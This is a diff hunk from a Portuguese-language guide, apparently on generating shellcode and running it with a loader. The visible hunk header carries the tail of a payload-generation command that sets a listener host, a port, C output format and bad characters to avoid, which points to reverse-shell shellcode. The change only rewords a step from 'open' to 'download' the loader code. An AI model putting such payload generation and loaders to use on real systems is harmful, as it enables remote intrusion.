@@ -67,7 +67,7 @@ LHOST=192.168.10.113 LPORT=1234 -f c -b \x00\x0a\x0d
 
 #### Step 2
 
-- Abrir o código do link mencionado no inicio, que tem o código responsável por executar os bytes gerados acima.
+- Fazer o download do código do link mencionado no inicio, que tem o código responsável por executar os bytes gerados acima.
 
 
 ```text
